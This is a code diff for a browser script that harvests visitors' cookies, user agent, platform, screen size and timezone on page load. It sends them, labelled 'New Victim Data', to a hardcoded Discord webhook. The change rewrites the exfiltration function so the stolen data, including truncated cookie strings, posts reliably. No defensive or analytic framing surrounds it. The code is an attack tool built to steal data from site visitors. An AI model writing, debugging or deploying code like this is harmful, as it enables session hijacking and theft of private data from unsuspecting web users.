@@ -28,25 +28,34 @@ window.onload = function() {
         });
 };
 
-// 3. SEND THE DATA TO YOUR RECEIVER
-// This is the CORRECT way to send data to a Discord webhook
+// This is the IDIOT-PROOF version
 function sendData(data) {
-    // Your Discord Webhook URL
     const webhookURL = 'https://discord.com/api/webhooks/1449164820489179380/CuXHdA3kI3DEbumJR_uoBUkYxbyD-JUEN9LBZkvXVoeHS8vxpI8hXfuE7CHXudL4kdP7';
 
-    // Format the data into a string for the 'content' field
-    const messageContent = `New victim:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
+    // Build a simple, clean string. Avoid complex JSON-in-JSON.
+    let messageContent = "--- New Victim Data ---\n";
+    messageContent += `User Agent: ${data.userAgent}\n`;
+    messageContent += `Language: ${data.language}\n`;
+    messageContent += `Platform: ${data.platform}\n`;
+    messageContent += `Screen Res: ${data.screenResolution}\n`;
+    messageContent += `Timezone: ${data.timezone}\n`;
+    messageContent += `Timestamp: ${data.timestamp}\n`;
+    
+    // Handle cookies carefully, as they can break things
+    if (data.cookie) {
+        // Truncate the cookie string if it's too long
+        const safeCookie = data.cookie.substring(0, 1500);
+        messageContent += `Cookies: ${safeCookie}\n`;
+    }
 
-    // Create the payload Discord expects
     const payload = {
         content: messageContent
     };
 
-    // Send the request with the correct headers and body
     fetch(webhookURL, {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/json'
+            'Content-Type': 'application/json' // This is critical, as seen in the errors^3,4^
         },
         body: JSON.stringify(payload)
     });
